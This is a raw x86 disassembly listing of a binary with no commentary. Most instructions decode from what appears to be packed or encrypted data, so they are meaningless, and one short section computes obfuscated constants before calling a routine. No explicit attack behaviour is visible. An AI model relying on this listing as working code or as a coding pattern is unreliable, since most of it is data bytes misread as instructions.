  40bb5c:	jg     0x40bb63
  40bb5e:	xchg   edx,eax
  40bb5f:	out    0x8c,al
  40bb61:	cwde   
  40bb62:	(bad)  
  40bb63:	sub    BYTE PTR [ebp+0x5c],bh
  40bb66:	push   cs
  40bb67:	sub    DWORD PTR [ebp-0x680d3ccd],ebp
  40bb6d:	add    DWORD PTR [eax-0x7],edx
  40bb70:	sti    
  40bb71:	div    BYTE PTR [esi+ecx*2]
  40bb74:	sahf   
  40bb75:	jnp    0x40bbbe
  40bb77:	mov    cl,0x70
  40bb79:	push   0xffffffb7
  40bb7b:	adc    esp,DWORD PTR [ecx]
  40bb7d:	add    ebp,DWORD PTR [ebp+0x6c6039b1]
  40bb83:	gs mov edx,0x65b324c5
  40bb89:	mov    ah,cl
  40bb8b:	jae    0x40bbce
  40bb8d:	aaa    
  40bb8e:	test   al,0x42
  40bb90:	inc    ecx
  40bb91:	xchg   DWORD PTR [ebp-0x153b64ef],ebp
  40bb97:	sbb    ebp,DWORD PTR [ecx]
  40bb99:	pushf  
  40bb9a:	xchg   esp,eax
  40bb9b:	loopne 0x40bbaf
  40bb9d:	les    ebp,FWORD PTR [esi+0x58032cd7]
  40bba3:	add    eax,0x18ce525a
  40bba8:	rcr    edx,1
  40bbaa:	jp     0x40bbac
  40bbac:	das    
  40bbad:	retf   
  40bbae:	mov    ds:0x3d3a0567,eax
  40bbb3:	retf   0x351e
  40bbb6:	(bad)  
  40bbb7:	int    0xf7
  40bbb9:	jge    0x40bb3c
  40bbbb:	lods   eax,DWORD PTR ds:[esi]
  40bbbc:	fcmove st,st(5)
  40bbbe:	add    BYTE PTR [edx-0x22],bh
  40bbc1:	cmp    eax,0x8a414761
  40bbc6:	arpl   WORD PTR [edx+0x232b88fc],di
  40bbcc:	es cdq 
  40bbce:	push   0x953ba0aa
  40bbd3:	adc    BYTE PTR [ecx+edi*2],al
  40bbd6:	cmp    edx,DWORD PTR [esi-0x5d05a8ba]
  40bbdc:	rol    DWORD PTR [edx-0x17],1
  40bbdf:	imul   edx,DWORD PTR [edi+0x3dfb3f3d],0xa
  40bbe6:	jle    0x40bc53
  40bbe8:	lahf   
  40bbe9:	test   BYTE PTR [esi],cl
  40bbeb:	jnp    0x40bbe6
  40bbed:	loopne 0x40bbed
  40bbef:	fucomi st,st(0)
  40bbf1:	mov    dl,0xa
  40bbf3:	psubsw mm3,QWORD PTR [esi]
  40bbf6:	pop    ds
  40bbf7:	imul   esp,DWORD PTR [eax],0x1924a0d5
  40bbfd:	inc    eax
  40bbfe:	ins    DWORD PTR es:[edi],dx
  40bbff:	mov    DWORD PTR [ebp+0x5e47c06d],eax
  40bc05:	mov    bh,0xd6
  40bc07:	daa    
  40bc08:	sbb    eax,0xf181d830
  40bc0d:	add    bh,ah
  40bc0f:	add    cl,BYTE PTR [ecx]
  40bc11:	dec    esp
  40bc12:	or     ah,BYTE PTR [esi-0x26]
  40bc15:	dec    esi
  40bc16:	cld    
  40bc17:	inc    esp
  40bc18:	xlat   BYTE PTR ds:[ebx]
  40bc19:	cdq    
  40bc1a:	cwde   
  40bc1b:	stos   BYTE PTR es:[edi],al
  40bc1c:	imul   ecx,DWORD PTR [esi-0x9],0x7a17bdd6
  40bc23:	aaa    
  40bc24:	and    edx,esi
  40bc26:	icebp  
  40bc27:	adc    BYTE PTR [esi+0x16499f69],cl
  40bc2d:	ret    0xa70c
  40bc30:	mov    dh,0x79
  40bc32:	adc    DWORD PTR [eax],ebx
  40bc34:	or     ebx,DWORD PTR [ecx-0x21f9deb5]
  40bc3a:	in     eax,dx
  40bc3b:	(bad)  
  40bc3c:	mov    ebx,0x978f6d57
  40bc41:	adc    DWORD PTR [esi-0x6a],eax
  40bc44:	js     0x40bbed
  40bc46:	je     0x40bc4f
  40bc48:	shl    ah,1
  40bc4a:	add    DWORD PTR [edi+0x11f1da5b],eax
  40bc50:	lock sti 
  40bc52:	lods   eax,DWORD PTR es:[esi]
  40bc54:	jge    0x40bc61
  40bc56:	push   es
  40bc57:	push   eax
  40bc58:	or     al,0x1d
  40bc5a:	lock stos BYTE PTR es:[edi],al
  40bc5c:	daa    
  40bc5d:	mov    WORD PTR [edi],?
  40bc5f:	pusha  
  40bc60:	dec    ebx
  40bc61:	mov    bh,bl
  40bc63:	arpl   WORD PTR [esi+0x20],si
  40bc66:	sar    DWORD PTR [edi],0x34
  40bc69:	ror    DWORD PTR [ebp+0x6d],0xf8
  40bc6d:	shr    DWORD PTR [eax],1
  40bc6f:	pushf  
  40bc70:	enter  0xd2bb,0x2d
  40bc74:	popf   
  40bc75:	sub    DWORD PTR [ebp+0x19],0xa346a4fb
  40bc7c:	jmp    0x40bc44
  40bc7e:	sub    bl,BYTE PTR [ecx]
  40bc80:	or     ecx,ebx
  40bc82:	dec    ecx
  40bc83:	add    ebx,DWORD PTR [esp+edx*1-0x44]
  40bc87:	adc    dh,BYTE PTR [ebx-0x44]
  40bc8a:	out    dx,al
  40bc8b:	(bad)  
  40bc8c:	imul   BYTE PTR [ebx+0x71]
  40bc8f:	xor    BYTE PTR [ecx],ch
  40bc91:	dec    edi
  40bc92:	cwde   
  40bc93:	fs sbb al,0x61
  40bc96:	sbb    dl,BYTE PTR [edx-0xa9edaaa]
  40bc9c:	lea    ebx,[edx+0x4baab74c]
  40bca2:	in     eax,0x29
  40bca4:	mov    BYTE PTR [eax-0x73fc2519],ch
  40bcaa:	pushf  
  40bcab:	xchg   edi,eax
  40bcac:	rcr    BYTE PTR [ecx+0x48848751],cl
  40bcb2:	sbb    al,0x8c
  40bcb4:	dec    eax
  40bcb5:	fsubrp st(2),st
  40bcb7:	arpl   WORD PTR [eax+0x77551a10],bx
  40bcbd:	aaa    
  40bcbe:	xchg   DWORD PTR [edx+esi*8+0x3a10f8b9],eax
  40bcc5:	mov    dl,BYTE PTR [ecx+eiz*1]
  40bcc8:	fld    TBYTE PTR [ebx+edi*4]
  40bccb:	xlat   BYTE PTR ds:[ebx]
  40bccc:	pop    ebp
  40bccd:	jle    0x40bcdd
  40bccf:	mov    eax,ds:0xc9013091
  40bcd4:	pushf  
  40bcd5:	int3   
  40bcd6:	cli    
  40bcd7:	xchg   ebp,eax
  40bcd8:	mov    bh,0x1e
  40bcda:	dec    eax
  40bcdb:	sbb    DWORD PTR ds:[esi-0x29],ebp
  40bcdf:	in     eax,dx
  40bce0:	fprem1 
  40bce2:	xor    eax,0x703ec6d
  40bce7:	fisub  WORD PTR [ebp-0x268a1cf4]
  40bced:	cmp    DWORD PTR [ebx+0x7d],edx
  40bcf0:	jle    0x40bd59
  40bcf2:	add    DWORD PTR [edi],edi
  40bcf4:	into   
  40bcf5:	dec    esp
  40bcf6:	cs loop 0x40bd39
  40bcf9:	inc    ebx
  40bcfa:	popf   
  40bcfb:	or     eax,0x4c5c4bac
  40bd00:	mov    DWORD PTR [ecx-0x79],ebp
  40bd03:	stc    
  40bd04:	xor    esi,DWORD PTR [ebp+edi*1+0x53]
  40bd08:	pop    esp
  40bd09:	adc    al,0x5
  40bd0b:	rcl    DWORD PTR [ebx+0x25],cl
  40bd0e:	sub    al,0x26
  40bd10:	adc    dl,BYTE PTR [edx]
  40bd12:	inc    edx
  40bd13:	stos   BYTE PTR es:[edi],al
  40bd14:	iret   
  40bd15:	out    dx,eax
  40bd16:	lock inc edi
  40bd18:	mov    edi,0xc6374b37
  40bd1d:	(bad)  
  40bd1e:	sar    BYTE PTR [edi+0x78ceff6d],0x8a
  40bd25:	je     0x40bd3e
  40bd27:	in     al,0xaf
  40bd29:	push   edx
  40bd2a:	jnp    0x40bcd9
  40bd2c:	mov    esi,0x29365fc3
  40bd31:	leave  
  40bd32:	(bad)  
  40bd33:	js     0x40bd20
  40bd35:	popf   
  40bd36:	adc    eax,0x77ea0e96
  40bd3b:	mov    al,BYTE PTR [esi+0x2855f611]
  40bd41:	mul    BYTE PTR [edi-0xa]
  40bd44:	(bad)  
  40bd45:	mov    dh,0x6e
  40bd47:	stos   BYTE PTR es:[edi],al
  40bd48:	dec    DWORD PTR [ecx]
  40bd4a:	or     al,0x44
  40bd4c:	int    0x8c
  40bd4e:	rcr    BYTE PTR [ebx+0x36],cl
  40bd51:	mov    ebx,0x6c5f10b2
  40bd56:	pop    ss
  40bd57:	in     al,dx
  40bd58:	shr    BYTE PTR [ecx-0x19055f69],1
  40bd5e:	loope  0x40bd9a
  40bd60:	pop    esp
  40bd61:	std    
  40bd62:	aaa    
  40bd63:	sti    
  40bd64:	xchg   DWORD PTR [eax*1+0x306cdc47],ebx
  40bd6b:	in     al,0xc0
  40bd6d:	push   eax
  40bd6e:	adc    esi,DWORD PTR [ecx+eax*4+0x8a9a2f7]
  40bd75:	sbb    eax,0x5b40b57a
  40bd7a:	inc    esp
  40bd7b:	dec    edx
  40bd7c:	pop    ss
  40bd7d:	mov    al,0xd6
  40bd7f:	add    dh,BYTE PTR [edx-0x37]
  40bd82:	jbe    0x40bdb1
  40bd84:	xchg   edi,eax
  40bd85:	lahf   
  40bd86:	or     DWORD PTR [edx],eax
  40bd88:	add    DWORD PTR [ebp+0x73],esp
  40bd8b:	xchg   ebx,eax
  40bd8c:	adc    BYTE PTR [esi-0xf],cl
  40bd8f:	repz (bad) 
  40bd91:	call   0xbd53f3c7
  40bd96:	pop    edx
  40bd97:	jl     0x40bdad
  40bd99:	pop    edi
  40bd9a:	(bad)  
  40bd9b:	retf   
  40bd9c:	pop    esi
  40bd9d:	sbb    cl,al
  40bd9f:	js     0x40bd9c
  40bda1:	jb     0x40bd2a
  40bda3:	inc    esi
  40bda4:	dec    edx
  40bda5:	out    dx,al
  40bda6:	mov    ebp,0x9ba55cb2
  40bdab:	jno    0x40bd3c
  40bdad:	xchg   ah,dl
  40bdaf:	cmp    ch,bh
  40bdb1:	sti    
  40bdb2:	push   ds
  40bdb3:	outs   dx,DWORD PTR ds:[esi]
  40bdb4:	sub    dh,ah
  40bdb6:	adc    ecx,DWORD PTR [ebx-0xbf9d3d2]
  40bdbc:	jnp    0x40bd93
  40bdbe:	push   ebp
  40bdbf:	inc    edx
  40bdc0:	push   ds
  40bdc1:	sub    al,0x7
  40bdc3:	mov    cl,0xa9
  40bdc5:	or     eax,0x21e9a78f
  40bdca:	cmp    ch,ch
  40bdcc:	add    al,0x74
  40bdce:	push   ss
  40bdcf:	dec    ebp
  40bdd0:	shr    al,0xa6
  40bdd3:	(bad)  
  40bdd4:	cld    
  40bdd5:	jl     0x40bd79
  40bdd7:	cdq    
  40bdd8:	pop    edx
  40bdd9:	stos   DWORD PTR es:[edi],eax
  40bdda:	std    
  40bddb:	cmp    edi,DWORD PTR [esi+edi*4-0x4fd8db47]
  40bde2:	outs   dx,BYTE PTR ds:[esi]
  40bde3:	mov    eax,0xba1f7118
  40bde8:	xchg   esi,eax
  40bde9:	pushf  
  40bdea:	jge    0x40be19
  40bdec:	mov    esi,0xf4e78e0e
  40bdf1:	fiadd  DWORD PTR [ecx-0x7]
  40bdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf5:	test   BYTE PTR [edx],dh
  40bdf7:	xchg   ebp,eax
  40bdf8:	mov    esp,0xc4fdd03f
  40bdfd:	cmp    BYTE PTR [si-0x4b],ah
  40be01:	into   
  40be02:	inc    edx
  40be03:	data16 data16 jecxz 0x40be53
  40be07:	mov    cl,BYTE PTR [ecx]
  40be09:	mov    esp,0x34856fe2
  40be0e:	and    DWORD PTR [esi-0x32],ebx
  40be11:	dec    ecx
  40be12:	cs test al,0xba
  40be15:	icebp  
  40be16:	or     al,0x42
  40be18:	sar    DWORD PTR [ebx+0x49],cl
  40be1b:	mov    dl,0x8e
  40be1d:	sub    DWORD PTR [ebx-0x6e],edx
  40be20:	cs xchg esp,eax
  40be22:	pop    ds
  40be23:	adc    DWORD PTR [ebx+0x4c],ebp
  40be26:	cmp    eax,edx
  40be28:	dec    ebp
  40be29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be2a:	cwde   
  40be2b:	or     DWORD PTR [edx-0x73],ecx
  40be2e:	push   ds
  40be2f:	leave  
  40be30:	ins    BYTE PTR es:[edi],dx
  40be31:	xchg   BYTE PTR ds:0x683bf88,ch
  40be37:	(bad)  [edx+0x5b9ff8a2]
  40be3d:	int    0x15
  40be3f:	pop    esi
  40be40:	(bad)  
  40be41:	mov    ch,0x57
  40be43:	push   edi
  40be44:	dec    ebx
  40be45:	inc    ecx
  40be46:	sbb    DWORD PTR [edi-0x22],ecx
  40be49:	adc    DWORD PTR [edi-0x1dc1587c],esp
  40be4f:	int    0xa1
  40be51:	retf   
  40be52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be53:	js     0x40beba
  40be55:	inc    esi
  40be56:	cli    
  40be57:	icebp  
  40be58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be59:	mov    edi,0xb20d01bc
  40be5e:	mov    DWORD PTR [esp+eiz*4-0x3cf291ec],ecx
  40be65:	push   eax
  40be66:	pop    ebx
  40be67:	scas   al,BYTE PTR es:[edi]
  40be68:	xor    al,0x84
  40be6a:	push   ss
  40be6b:	mov    BYTE PTR [ebp-0x58],bh
  40be6e:	out    0xa4,eax
  40be70:	data16 xor BYTE PTR [eax],bh
  40be73:	adc    dl,BYTE PTR [ecx+0x49]
  40be76:	cmp    BYTE PTR [esi],ch
  40be78:	sbb    eax,0x8a2f28df
  40be7d:	and    al,BYTE PTR [eax-0x532cdcaf]
  40be83:	or     edi,ebp
  40be85:	test   al,0xa
  40be87:	(bad)  
  40be88:	mov    DWORD PTR [ebp-0xc],ecx
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bedd
  40bf55:	cmp    ecx,ebx
  40bf57:	jo     0x40bf0f
  40bf59:	add    eax,0x126e1818
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	call   edi
  40bf62:	loop   0x40bf94
  40bf64:	mov    eax,ds:0x9e7e5ce8
  40bf69:	cdq    
  40bf6a:	jmp    0x8289221f
  40bf6f:	aam    0x2f
  40bf71:	hlt    
  40bf72:	mov    dh,0x36
  40bf74:	outs   dx,DWORD PTR ds:[esi]
  40bf75:	jno    0x40bf80
  40bf77:	scas   al,BYTE PTR es:[edi]
  40bf78:	(bad)  
  40bf79:	cmp    al,BYTE PTR [edx+0x27538559]
  40bf7f:	pop    ecx
  40bf80:	bound  edi,QWORD PTR [ebp-0x6a3d06a2]
  40bf86:	ss retf 0x6e35
  40bf8a:	lock data16 mov BYTE PTR [edx],bl
  40bf8e:	pop    es
  40bf8f:	stos   BYTE PTR es:[edi],al
  40bf90:	pop    ss
  40bf91:	bnd ret 
  40bf93:	sub    DWORD PTR [ecx],edx
  40bf95:	test   BYTE PTR [ecx+esi*4+0x18],bl
  40bf99:	test   DWORD PTR [esi+0x48],ebp
  40bf9c:	mov    cl,0xfa
  40bf9e:	mov    cl,0x77
  40bfa0:	mov    edi,0x45bfda2
  40bfa5:	mov    eax,ds:0x28952524
  40bfaa:	test   bl,al
  40bfac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfad:	out    0x70,eax
  40bfaf:	sbb    esi,ebx
  40bfb1:	mov    eax,ds:0x472ee4cc
  40bfb6:	mov    ?,ecx
  40bfb8:	or     ax,0xfc0d
  40bfbc:	mov    eax,ds:0x1fb153c0
  40bfc1:	xchg   esp,eax
  40bfc2:	aam    0x83
  40bfc4:	sub    BYTE PTR [eax-0x4c7ce0ac],dl
  40bfca:	rcr    BYTE PTR [esi],1
  40bfcc:	sub    BYTE PTR [ebp+0x19e87383],cl
  40bfd2:	add    DWORD PTR [eax],esp
  40bfd4:	push   edi
  40bfd5:	sub    eax,DWORD PTR [eax+edx*1+0x70]
  40bfd9:	cld    
  40bfda:	ins    BYTE PTR es:[edi],dx
  40bfdb:	add    BYTE PTR [edi+0x72c462d0],0x53
  40bfe2:	dec    edx
  40bfe3:	dec    esp
  40bfe4:	push   ds
  40bfe5:	and    eax,0x4df677cd
  40bfea:	lds    ebx,FWORD PTR [ecx]
  40bfec:	dec    eax
  40bfed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfee:	cmp    al,BYTE PTR [edx-0x314f9b6d]
  40bff4:	loope  0x40bfae
  40bff6:	sbb    BYTE PTR [ebx-0xb0323f],al
  40bffc:	sti    
  40bffd:	sbb    al,0x2f
  40bfff:	inc    esi
  40c000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c001:	mov    ds:0x7818e70f,al
  40c006:	daa    
  40c007:	mov    esp,0x663bfd88
  40c00c:	popf   
  40c00d:	test   al,0x20
  40c00f:	lock imul ebp,DWORD PTR [ecx-0x17],0x2c
  40c014:	adc    al,0xf1
  40c016:	frstor [edx-0x4b36fe74]
  40c01c:	dec    edx
  40c01d:	mov    eax,0x83710a9e
  40c022:	bound  esi,QWORD PTR [esi]
  40c024:	leave  
  40c025:	aad    0x2c
  40c027:	inc    ebp
  40c028:	sar    DWORD PTR [ecx+0x3a],1
  40c02b:	push   0xffffffec
  40c02d:	aad    0x6d
  40c02f:	push   esp
  40c030:	sar    DWORD PTR [eax+esi*8],0x8d
  40c034:	cmc    
  40c035:	ret    
  40c036:	mov    al,0xf7
  40c038:	js     0x40c00b
  40c03a:	cmc    
  40c03b:	addr16 add esi,ebx
  40c03e:	scas   eax,DWORD PTR es:[edi]
  40c03f:	adc    al,0xa5
  40c041:	not    DWORD PTR cs:[edi-0x67bc9b23]
  40c048:	jge    0x40c054
  40c04a:	and    ch,bl
  40c04c:	pop    esp
  40c04d:	psrlw  mm0,QWORD PTR [ebx-0x1426c53f]
  40c054:	data16 mov es,WORD PTR [edi]
  40c057:	ss ins DWORD PTR es:[edi],dx
  40c059:	push   esp
  40c05a:	leave  
  40c05b:	repz ret 
  40c05d:	sub    BYTE PTR [ecx+0x57672547],0x3c
  40c064:	(bad)  
  40c065:	(bad)  
  40c066:	jns    0x40c082
  40c068:	adc    al,0x67
  40c06a:	scas   eax,DWORD PTR es:[edi]
  40c06b:	xchg   edi,eax
  40c06c:	sahf   
  40c06d:	mov    ecx,0xd5a44f04
  40c072:	out    dx,eax
  40c073:	ror    BYTE PTR [esi+0x3f396cb2],cl
  40c079:	xchg   BYTE PTR [esp+eax*2],cl
  40c07c:	xchg   edi,eax
  40c07d:	sbb    BYTE PTR [eax-0x1c763a29],dh
  40c083:	lock and DWORD PTR [edx-0x75],edx
  40c087:	xchg   ecx,eax
  40c088:	lods   eax,DWORD PTR ds:[esi]
  40c089:	mov    edi,0xd8ef3af6
  40c08e:	nop
  40c08f:	mov    WORD PTR [ebp+0x7e0db13f],ss
  40c095:	and    al,BYTE PTR [ebx]
  40c097:	and    al,0xcf
  40c099:	sysexit 
  40c09b:	and    cl,bl
  40c09d:	sbb    edi,ecx
  40c09f:	push   0x4fc2f583
  40c0a4:	sub    BYTE PTR ds:0xe16960c8,ah
  40c0aa:	adc    al,0xeb
  40c0ac:	mov    edi,0xd816c509
  40c0b1:	add    DWORD PTR [ebx+ebx*2+0x1d],ebx
  40c0b5:	jo     0x40c097
  40c0b7:	das    
  40c0b8:	call   0x444d1c59
  40c0bd:	popf   
  40c0be:	repz jle 0x40c10e
  40c0c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c2:	repnz xchg ebp,eax
  40c0c4:	pop    ebp
  40c0c5:	inc    esp
  40c0c6:	cmp    dh,bh
  40c0c8:	xchg   esp,eax
  40c0c9:	or     al,0xd
  40c0cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0cc:	add    BYTE PTR [eax],cl
  40c0ce:	xchg   esi,eax
  40c0cf:	sahf   
  40c0d0:	pop    DWORD PTR [ecx-0x15]
  40c0d3:	and    al,0xd
  40c0d5:	mov    dl,0xea
  40c0d7:	das    
  40c0d8:	jle    0x40c13c
  40c0da:	push   0xb160f99d
  40c0df:	sbb    al,0x1c
  40c0e1:	sar    DWORD PTR [ecx-0x7ae97547],1
  40c0e7:	repnz pop ecx
  40c0e9:	jl     0x40c14e
  40c0eb:	aad    0x90
  40c0ed:	pop    esp
  40c0ee:	xor    eax,0x3515f04b
  40c0f3:	dec    ebx
  40c0f4:	hlt    
  40c0f5:	int3   
  40c0f6:	cmp    BYTE PTR [edx+0x5ce16beb],0x4
  40c0fd:	add    ebp,edx
  40c0ff:	adc    edx,DWORD PTR [edi+0x37c2f2d0]
  40c105:	xchg   DWORD PTR [esi-0x54],ecx
  40c108:	push   ds
  40c109:	jmp    0x40c156
  40c10b:	and    DWORD PTR [edi-0x726e5a4],ebp
  40c111:	test   BYTE PTR [ecx-0x44],cl
  40c114:	outs   dx,DWORD PTR ds:[esi]
  40c115:	call   0x5d018e66
  40c11a:	pusha  
  40c11b:	push   0x799e7fa0
  40c120:	jmp    0x8c6563bb
  40c125:	sti    
  40c126:	jp     0x40c0aa
  40c128:	mov    ebx,0x40346a79
  40c12d:	or     DWORD PTR [edi],ecx
  40c12f:	or     ebp,edx
  40c131:	or     al,ch
  40c133:	sahf   
  40c134:	cwde   
  40c135:	jnp    0x40c17e
  40c137:	push   ebp
  40c138:	cld    
  40c139:	mov    ecx,0xfa2fc069
  40c13e:	push   ebp
  40c13f:	(bad)  
  40c140:	fcomp  st(7)
  40c142:	fdivr  st(3),st
  40c144:	push   edx
  40c145:	cld    
  40c146:	add    DWORD PTR [ecx],0x2ae4a52
  40c14c:	fidiv  DWORD PTR [edx]
  40c14e:	jno    0x40c1a6
  40c150:	dec    esp
  40c151:	xchg   ecx,eax
  40c152:	add    edi,ebp
  40c154:	jmp    0x8d33c58d
  40c159:	(bad)  
  40c15a:	mov    eax,0x35917821
  40c15f:	mov    dl,0xaa
  40c161:	outs   dx,DWORD PTR ds:[esi]
  40c162:	jb     0x40c194
  40c164:	mov    ah,BYTE PTR [edx]
  40c166:	je     0x40c0eb
  40c168:	and    al,0x8f
  40c16a:	or     WORD PTR [ecx-0x27755cd4],bx
  40c171:	aas    
  40c172:	jns    0x40c126
  40c174:	push   es
  40c175:	fld    QWORD PTR [eax]
  40c177:	xor    DWORD PTR [edi+0x5],ecx
  40c17a:	adc    dh,BYTE PTR [ebx+0x1ae8d4d8]
  40c180:	sub    DWORD PTR [esi+ecx*1],esi
  40c183:	test   BYTE PTR [ecx],0xdf
  40c186:	xor    DWORD PTR [ebx+ebp*1+0x54eb143d],eax
  40c18d:	ins    BYTE PTR es:[edi],dx
  40c18e:	xchg   edi,eax
  40c18f:	loop   0x40c1a5
  40c191:	mov    ah,0xc2
  40c193:	sbb    BYTE PTR [eax],cl
  40c195:	mov    al,bl
  40c197:	and    al,0x3
  40c199:	icebp  
  40c19a:	dec    ebx
  40c19b:	ret    0xb108
  40c19e:	xchg   ebp,eax
  40c19f:	mov    ah,0xf9
  40c1a1:	ds sbb ch,dl
  40c1a4:	out    0xb,al
  40c1a6:	imul   edi,DWORD PTR ds:0x923b6d20,0xffffffa7
  40c1ad:	push   edx
  40c1ae:	xor    bh,BYTE PTR [edi*4-0x427e9c9f]
  40c1b5:	and    al,0xdd
  40c1b7:	or     ebp,DWORD PTR [eax-0x55af475]
  40c1bd:	mov    dh,0xa3
  40c1bf:	test   BYTE PTR [ebx],bh
  40c1c1:	enter  0x2230,0xf3
  40c1c5:	inc    ecx
  40c1c6:	outs   dx,DWORD PTR ds:[esi]
  40c1c7:	mov    ecx,0x545b5e8e
  40c1cc:	fnsave [esi+0x0]
  40c1cf:	test   BYTE PTR [ebp+0xb],cl
  40c1d2:	je     0x40c21b
  40c1d4:	xlat   BYTE PTR ds:[ebx]
  40c1d5:	adc    BYTE PTR [ecx+esi*4-0x375c4994],0xf0
  40c1dd:	push   ss
  40c1de:	dec    edi
  40c1df:	mov    DWORD PTR [eax+eiz*8-0x43],ecx
  40c1e3:	loope  0x40c196
  40c1e5:	loopne 0x40c235
  40c1e7:	xchg   ebp,eax
  40c1e8:	(bad)
  40c1ed:	fnstsw WORD PTR [ebp-0x2c275de8]
  40c1f3:	loope  0x40c181
  40c1f5:	imul   eax,DWORD PTR [eax],0x4d
  40c1f8:	and    eax,edi
  40c1fa:	adc    DWORD PTR [edx-0x68fcd767],ebp
  40c200:	into   
  40c201:	(bad)  
  40c202:	pop    si
  40c204:	mov    ecx,ebp
  40c206:	aam    0x8
  40c208:	xchg   esp,eax
  40c209:	int    0x11
  40c20b:	leave  
  40c20c:	lods   al,BYTE PTR ds:[esi]
  40c20d:	xor    cl,BYTE PTR [edx-0x33]
  40c210:	in     eax,dx
  40c211:	push   ebx
  40c212:	sub    cl,BYTE PTR [esp+ebx*1]
  40c215:	repz ret 0x231f
  40c219:	lods   al,BYTE PTR ds:[esi]
  40c21a:	(bad)  
  40c21b:	adc    dh,BYTE PTR [ecx+0x5446dbaf]
  40c221:	inc    ecx
  40c222:	jecxz  0x40c241
  40c224:	jae    0x40c211
  40c226:	popf   
  40c227:	sbb    BYTE PTR [esi+0x48],dl
  40c22a:	push   ds
  40c22b:	sub    eax,0x53144063
  40c230:	arpl   WORD PTR [esi],si
  40c232:	popf   
  40c233:	fadd   st(2),st
  40c235:	adc    DWORD PTR [esi],edi
  40c237:	add    dl,BYTE PTR [edx-0x1ffd3d32]
  40c23d:	xor    ecx,DWORD PTR [edx+0x675a2ef9]
  40c243:	mov    bh,0xf2
  40c245:	int    0x51
  40c247:	xor    ebp,DWORD PTR [ebx+0x4a208684]
  40c24d:	sub    edx,DWORD PTR [edi-0x20012038]
  40c253:	or     BYTE PTR [edi+0x24],bl
  40c256:	mov    eax,0xbef7d9b8
  40c25b:	lods   al,BYTE PTR ds:[esi]
  40c25c:	add    DWORD PTR [edi-0x63],edx
  40c25f:	clc    
  40c260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c261:	dec    ebp
  40c262:	cmc    
  40c263:	fdiv   QWORD PTR [edx+0x2b9afb9c]
  40c269:	shl    esi,cl
  40c26b:	mov    ch,0x84
  40c26d:	pop    ebx
  40c26e:	std    
  40c26f:	xchg   edi,eax
  40c270:	or     eax,esp
  40c272:	and    ch,dh
  40c274:	pop    ds
  40c275:	ror    DWORD PTR [edx+ecx*2+0x12],cl
  40c279:	lds    ebx,FWORD PTR [ebp+0x10]
  40c27c:	enter  0x1116,0xd2
  40c280:	rol    edx,0x53
  40c283:	or     dl,BYTE PTR [di+0x1e]
  40c287:	and    BYTE PTR [ecx],cl
  40c289:	repnz fcom DWORD PTR [ecx*4-0x2946e264]
  40c291:	push   edx
  40c292:	rol    DWORD PTR [esi+esi*4],1
  40c295:	sub    eax,0xb1c59bfb
  40c29a:	inc    ebp
  40c29b:	mov    esi,0x571b7898
  40c2a0:	pop    edx
  40c2a1:	adc    al,0x0
  40c2a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a4:	test   al,0x19
  40c2a6:	push   cs
  40c2a7:	fwait
  40c2a8:	xchg   DWORD PTR [ebx],ebx
  40c2aa:	(bad)  
  40c2ac:	pop    esp
  40c2ad:	and    dl,bh
  40c2af:	add    esi,eax
  40c2b1:	push   ds
  40c2b2:	cmp    eax,0xe0f588e
  40c2b7:	sbb    al,0x88
  40c2b9:	ret    
  40c2ba:	out    0xd7,al
  40c2bc:	mov    WORD PTR [ecx-0x2d7b3b02],es
  40c2c2:	xlat   BYTE PTR ds:[ebx]
  40c2c3:	ins    DWORD PTR es:[edi],dx
  40c2c4:	int    0xa3
  40c2c6:	adc    ch,BYTE PTR [eax+0x51]
  40c2c9:	cli    
